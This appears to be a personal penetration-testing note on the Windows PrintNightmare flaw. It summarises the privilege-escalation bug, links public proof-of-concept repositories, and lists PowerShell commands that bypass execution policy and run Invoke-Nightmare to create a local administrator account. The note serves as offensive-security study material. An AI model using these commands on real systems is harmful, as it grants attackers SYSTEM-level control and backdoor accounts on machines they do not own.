## PrintNightmare CVE-2021-1675/CVE-2021-34527

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` - 
**Vuln:** Flaw in `RpcAddPrinterDriver` (Print Spooler API).  
- **Intended:** Only users with `SeLoadDriverPrivilege` (Admins, Print Operators) can remotely install printer drivers.  
- **Bug:** Any **authenticated user** could add a driver â†’ load malicious DLL.  
- **Result:** **PRIVESC TO SYSTEM** 
## exploitation
- The repo below contains a C# implementation. try it first
- [This](https://github.com/cube0x0/CVE-2021-1675)  cube-ctl remotely but requires modified impacket.
- This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) : this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

`checking if spooler service is running`
```
ls \\localhost\pipe\spoolss
```
![](Pasted%20image%2020250320205627.png)
#### Adding Local Admin with PrintNightmare PowerShell PoC

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
 Import-Module .\CVE-2021-1675.ps1
 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

`confirm`
```
net user <user>
```

